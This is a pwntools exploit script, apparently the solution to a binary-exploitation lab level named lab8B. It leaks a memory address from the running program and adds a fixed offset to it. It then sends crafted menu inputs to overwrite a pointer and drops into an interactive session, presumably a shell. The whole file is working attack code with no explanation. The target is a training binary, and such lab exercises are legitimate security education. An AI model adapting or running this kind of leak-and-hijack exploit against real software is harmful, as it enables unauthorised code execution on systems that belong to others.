from pwn import *
import struct
from binascii import hexlify as hexa

# context.log_level = 'debug'

p = process('/levels/lab08/lab8B')

raw_input('Press Enter...')

p.sendline('3')
p.recv(2048)
p.sendline('1')
a = p.recv(100-40)

leak = a[51:51+4]

print 'Leak: 0x' + hexa(p32(struct.unpack(">L",leak)[0]))

adres = hexa(p32(struct.unpack(">L",leak)[0]))

adres2 = int(adres, 16) + 0x190e27

p.sendline('1')
p.sendline('1')
p.sendline('\x41')
p.sendline('23487')
p.sendline('11111')
p.sendline('11111')

p.sendline('1')

p.sendline('11111')
p.sendline('11111')
p.sendline('11111')
p.sendline('11111')

p.sendline('1')
p.sendline('2')
p.sendline('\x66')

p.sendline('23487')
p.sendline('2222')
p.sendline('9999')
p.sendline(str(adres2))

p.sendline('2222')
p.sendline('2222')
p.sendline('2222')
p.sendline('2222')

p.sendline('2')

p.sendline('4')

p.sendline('4')
p.sendline('4')
p.sendline('4')
p.sendline('4')


p.sendline('6')
p.sendline('4')
p.sendline('1')

p.sendline('3')
p.sendline('1')
p.interactive()